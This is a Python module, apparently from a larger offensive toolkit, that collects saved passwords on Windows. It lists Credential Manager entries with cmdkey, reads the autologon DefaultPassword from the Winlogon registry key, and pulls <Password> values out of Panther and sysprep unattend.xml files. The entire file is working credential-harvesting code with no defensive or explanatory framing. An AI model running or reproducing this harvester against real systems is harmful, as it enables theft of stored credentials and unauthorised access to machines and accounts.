"""
Windows-specific credential harvesting
"""

import os
import re
from ..core.utils import run_command, safe_read_file


class WindowsHarvester:
    """Harvest Windows-specific credentials"""
    
    def __init__(self, credentials: dict):
        self.credentials = credentials
    
    def harvest_all(self):
        """Run all Windows harvesting methods"""
        print("\n[*] Harvesting Windows credentials...")
        
        self.harvest_credential_manager()
        self.harvest_registry_autologon()
        self.harvest_unattend_files()
    
    def harvest_credential_manager(self):
        """Check Windows Credential Manager"""
        cmdkey = run_command('cmdkey /list')
        
        if cmdkey and 'Target:' in cmdkey:
            print("  [+] Found saved credentials:")
            print(cmdkey[:500])
            
            self.credentials['passwords'].append({
                'source': 'Windows Credential Manager',
                'type': 'Saved Credentials',
                'data': cmdkey
            })
    
    def harvest_registry_autologon(self):
        """Check registry for autologon credentials"""
        autologon = run_command(
            'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul'
        )
        
        if autologon and 'DefaultPassword' in autologon:
            print("  [+] Found autologon password in registry!")
            
            self.credentials['passwords'].append({
                'source': 'Registry Autologon',
                'type': 'Windows Autologon',
                'data': autologon
            })
    
    def harvest_unattend_files(self):
        """Search for unattend.xml files with credentials"""
        unattend_paths = [
            'C:\\Windows\\Panther\\Unattend.xml',
            'C:\\Windows\\Panther\\Unattended.xml',
            'C:\\Windows\\System32\\sysprep\\unattend.xml'
        ]
        
        for path in unattend_paths:
            if os.path.exists(path):
                content = safe_read_file(path)
                
                if content and 'password' in content.lower():
                    print(f"  [+] Found unattend file: {path}")
                    
                    # Extract passwords from XML
                    passwords = re.findall(r'<Password>(.+?)</Password>', content, re.IGNORECASE)
                    for pwd in passwords:
                        self.credentials['passwords'].append({
                            'source': path,
                            'type': 'Unattend File',
                            'credential': pwd
                        })